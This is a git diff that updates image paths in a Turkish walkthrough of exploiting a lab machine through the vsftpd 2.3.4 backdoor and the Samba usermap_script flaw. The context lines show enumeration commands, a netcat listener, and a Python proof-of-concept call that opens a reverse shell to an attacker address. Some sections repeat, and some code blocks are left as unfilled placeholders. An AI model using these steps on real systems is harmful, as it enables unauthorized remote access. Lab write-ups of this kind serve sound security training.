@@ -113,7 +113,7 @@ FTP anonim girişlere izin verdiği için kontrol edeyim dedim ama dizin boştu.
 
 vsftpd 2.3.4 ünlü bir backdoor FTP sunucusudur. Ancak bunu bilmeden bile, vsftpd'nin bu sürümü için bir exploit olduğunu gösterecek olan searchsploit'i kontrol etmeye her zaman değer:
 
-![Pasted image 20250205201132.png](/img/user/Pasted%20image%2020250205201132.png)
+![Pasted image 20250205201132.png](/img/user/resimler/Pasted%20image%2020250205201132.png)
 
 Bunu kesinlikle denemek isteyeceğim.
 
@@ -127,11 +127,11 @@ smbmap, kimlik bilgileri olmadan erişebileceğim yalnızca bir paylaşım göst
 smbmap -H 10.10.10.3
 ```
 
-![Pasted image 20250205201226.png](/img/user/Pasted%20image%2020250205201226.png)
+![Pasted image 20250205201226.png](/img/user/resimler/Pasted%20image%2020250205201226.png)
 
 smbclient ile /tmp dizinine bağlanma
 
-![Pasted image 20250205201411.png](/img/user/Pasted%20image%2020250205201411.png)
+![Pasted image 20250205201411.png](/img/user/resimler/Pasted%20image%2020250205201411.png)
 
 Eğer bağlanmaz ise ; Client'in güvenlik nedeniyle [eski SMB sürümlerine bağlanmamak üzere ayarlandığı ortaya çıktı](https://www.wombacher.cc/accessing-smb-share-on-old-nas-failed-from-linux/). Aşağıdakileri /etc/samba.smb.conf dosyama ekledim ve sonra sorunsuz çalışıyor:
 
@@ -153,7 +153,7 @@ Giriş yapacağım, ancak /tmp'ye eşlenmiş gibi göründüğü için içinde i
 
 Samba'yı da searchsploit'te kontrol edeceğim:
 
-![Pasted image 20250205201711.png](/img/user/Pasted%20image%2020250205201711.png)
+![Pasted image 20250205201711.png](/img/user/resimler/Pasted%20image%2020250205201711.png)
 
 3.0.19 < 3.0.21 gibi bir şey yazmasına izin vermek için sadece 3.0'ı arayacağım. Umut verici görünen bir şey var:
 
@@ -181,24 +181,24 @@ VSFTPD 2.3.4'teki bu güvenlik açığı, geliştiricinin resmi sürümüne ekle
 
 Bu sürümde, FTP sunucusuna giriş yaparken **kullanıcı adı sonunda `:)`** karakterleri varsa, arka kapı mekanizması devreye girer. Bunun sonucunda, **TCP bağlantı noktasında (`port 6200`) bir reverse shell açılır**.
 
-![Pasted image 20250205202940.png](/img/user/Pasted%20image%2020250205202940.png)
+![Pasted image 20250205202940.png](/img/user/resimler/Pasted%20image%2020250205202940.png)
 
-![Pasted image 20250205202947.png](/img/user/Pasted%20image%2020250205202947.png)
+![Pasted image 20250205202947.png](/img/user/resimler/Pasted%20image%2020250205202947.png)
 
 
 ### With Metasploit
 
 Bu exploiti yeterince anladım ve Metasploit'te de farklı olmayacağını biliyorum, ancak burada gösterebilirim. msfconsole'u başlatıp aratacağım:
 
-![Pasted image 20250205203137.png](/img/user/Pasted%20image%2020250205203137.png)
+![Pasted image 20250205203137.png](/img/user/resimler/Pasted%20image%2020250205203137.png)
 
 Onu kullanacağım ve hedefi belirleyeceğim:
 
 Payload'u `cmd/unix/interact` olarak ayarlayın ve çalıştırın:
 
-![Pasted image 20250205203309.png](/img/user/Pasted%20image%2020250205203309.png)
+![Pasted image 20250205203309.png](/img/user/resimler/Pasted%20image%2020250205203309.png)
 
-![Pasted image 20250205203411.png](/img/user/Pasted%20image%2020250205203411.png)
+![Pasted image 20250205203411.png](/img/user/resimler/Pasted%20image%2020250205203411.png)
 
 Yine de başarısız oluyor.
 
@@ -213,7 +213,7 @@ Bunun neden başarısız olduğunu Beyond Root'ta inceleyeceğim.
 
 Neler olduğunu anlamak için, exploit'in kaynağını alacağım:
 
-![Pasted image 20250205203622.png](/img/user/Pasted%20image%2020250205203622.png)
+![Pasted image 20250205203622.png](/img/user/resimler/Pasted%20image%2020250205203622.png)
 
 Oldukça kısa:
 
@@ -276,13 +276,13 @@ Yani temel olarak Linux'ta  ` `  ifadeleri, komutu çalıştırıp çıktısın�
 
 Bunu smbclient ile deneyeceğim. 443'te bir nc listener başlatacağım. Paylaşıma smbclient //10.10.10.3/tmp kullanarak bağlanabiliyorum. Önce bir kullanıcı belirtmeyi denedim:
 
-![Pasted image 20250205204058.png](/img/user/Pasted%20image%2020250205204058.png)
+![Pasted image 20250205204058.png](/img/user/resimler/Pasted%20image%2020250205204058.png)
 
-![Pasted image 20250205204359.png](/img/user/Pasted%20image%2020250205204359.png)
+![Pasted image 20250205204359.png](/img/user/resimler/Pasted%20image%2020250205204359.png)
 
 listener'la bir bağlantı kurdum:
 
-![Pasted image 20250205204407.png](/img/user/Pasted%20image%2020250205204407.png)
+![Pasted image 20250205204407.png](/img/user/resimler/Pasted%20image%2020250205204407.png)
 
 ```
 Ne yazık ki, bu benim local kutumdan. Bash'ım bağlantıyı göndermeden önce    ` ` komutunu çalıştırıyor. “ ile ' yi değiştireceğim:
@@ -290,22 +290,22 @@ Ne yazık ki, bu benim local kutumdan. Bash'ım bağlantıyı göndermeden önce
 
 Bazı nedenlerden dolayı, komutun başlangıcı büyük harfle yazılıyor ve bu da yürütmeyi bozuyor.
 
-![Pasted image 20250205204531.png](/img/user/Pasted%20image%2020250205204531.png)
+![Pasted image 20250205204531.png](/img/user/resimler/Pasted%20image%2020250205204531.png)
 
 
 #### smbclient success
 
 Görünüşe göre smbclient üzerinden giriş yapmanın başka bir yolu daha var ve bu, logon komutuyla bağlandıktan sonra kullanıcıları değiştirmek için kullanılıyor (şifre sorulduğunda sadece enter tuşuna basıyorum):
 
-![Pasted image 20250205204711.png](/img/user/Pasted%20image%2020250205204711.png)
+![Pasted image 20250205204711.png](/img/user/resimler/Pasted%20image%2020250205204711.png)
 
-![Pasted image 20250205204728.png](/img/user/Pasted%20image%2020250205204728.png)
+![Pasted image 20250205204728.png](/img/user/resimler/Pasted%20image%2020250205204728.png)
 
 ### Python Script
 
 Biraz Google araması beni bu açık için bir Python POC içeren bu GitHub'a yönlendirdi. “ Install” talimatlarını izleyerek ve ardından scripti çalıştırarak kolayca bir shell elde edebilirim:
 
-![Pasted image 20250205204847.png](/img/user/Pasted%20image%2020250205204847.png)
+![Pasted image 20250205204847.png](/img/user/resimler/Pasted%20image%2020250205204847.png)
 
 ```
 root@kali# python usermap_script.py 10.10.10.3 139 10.10.16.9 443
@@ -388,14 +388,14 @@ fakat bu şekilde çalıştırdığımda çalıştı .
 
 Sonra da bayrakları al:
 
-![Pasted image 20250205205904.png](/img/user/Pasted%20image%2020250205205904.png)
+![Pasted image 20250205205904.png](/img/user/resimler/Pasted%20image%2020250205205904.png)
 
 
 ## Beyond Root - VSFTPd
 
 Peki VSFTPd'ye ne oldu? Kutuyu nmap ile ilk taradığımda, dört açık TCP portu gösterdi: FTP (21), SSH (22), Samba (139, 445) ve 3632'de bir şey. Ancak bir shell ile çok daha fazla listener görebildim:
 
-![Pasted image 20250205210002.png](/img/user/Pasted%20image%2020250205210002.png)
+![Pasted image 20250205210002.png](/img/user/resimler/Pasted%20image%2020250205210002.png)
 
 Firewall çok fazla engelleme yapıyor olmalı.
 
@@ -493,34 +493,34 @@ end
 
 Bunu smbclient ile deneyeceğim. 443'te bir nc listener başlatacağım. Paylaşıma smbclient //10.10.10.3/tmp kullanarak bağlanabiliyorum. Önce bir kullanıcı belirtmeyi denedim:
 
-![Pasted image 20250205204058.png](/img/user/Pasted%20image%2020250205204058.png)
+![Pasted image 20250205204058.png](/img/user/resimler/Pasted%20image%2020250205204058.png)
 
-![Pasted image 20250205204359.png](/img/user/Pasted%20image%2020250205204359.png)
+![Pasted image 20250205204359.png](/img/user/resimler/Pasted%20image%2020250205204359.png)
 
 listener'la bir bağlantı kurdum:
 
-![Pasted image 20250205204407.png](/img/user/Pasted%20image%2020250205204407.png)
+![Pasted image 20250205204407.png](/img/user/resimler/Pasted%20image%2020250205204407.png)
 
 {{CODE_BLOCK_10}}
 
 Bazı nedenlerden dolayı, komutun başlangıcı büyük harfle yazılıyor ve bu da yürütmeyi bozuyor.
 
-![Pasted image 20250205204531.png](/img/user/Pasted%20image%2020250205204531.png)
+![Pasted image 20250205204531.png](/img/user/resimler/Pasted%20image%2020250205204531.png)
 
 
 #### smbclient success
 
 Görünüşe göre smbclient üzerinden giriş yapmanın başka bir yolu daha var ve bu, logon komutuyla bağlandıktan sonra kullanıcıları değiştirmek için kullanılıyor (şifre sorulduğunda sadece enter tuşuna basıyorum):
 
-![Pasted image 20250205204711.png](/img/user/Pasted%20image%2020250205204711.png)
+![Pasted image 20250205204711.png](/img/user/resimler/Pasted%20image%2020250205204711.png)
 
-![Pasted image 20250205204728.png](/img/user/Pasted%20image%2020250205204728.png)
+![Pasted image 20250205204728.png](/img/user/resimler/Pasted%20image%2020250205204728.png)
 
 ### Python Script
 
 Biraz Google araması beni bu açık için bir Python POC içeren bu GitHub'a yönlendirdi. “ Install” talimatlarını izleyerek ve ardından scripti çalıştırarak kolayca bir shell elde edebilirim:
 
-![Pasted image 20250205204847.png](/img/user/Pasted%20image%2020250205204847.png)
+![Pasted image 20250205204847.png](/img/user/resimler/Pasted%20image%2020250205204847.png)
 
 {{CODE_BLOCK_11}}
 
@@ -554,14 +554,14 @@ fakat bu şekilde çalıştırdığımda çalıştı .
 
 Sonra da bayrakları al:
 
-![Pasted image 20250205205904.png](/img/user/Pasted%20image%2020250205205904.png)
+![Pasted image 20250205205904.png](/img/user/resimler/Pasted%20image%2020250205205904.png)
 
 
 ## Beyond Root - VSFTPd
 
 Peki VSFTPd'ye ne oldu? Kutuyu nmap ile ilk taradığımda, dört açık TCP portu gösterdi: FTP (21), SSH (22), Samba (139, 445) ve 3632'de bir şey. Ancak bir shell ile çok daha fazla listener görebildim:
 
-![Pasted image 20250205210002.png](/img/user/Pasted%20image%2020250205210002.png)
+![Pasted image 20250205210002.png](/img/user/resimler/Pasted%20image%2020250205210002.png)
 
 Firewall çok fazla engelleme yapıyor olmalı.
 
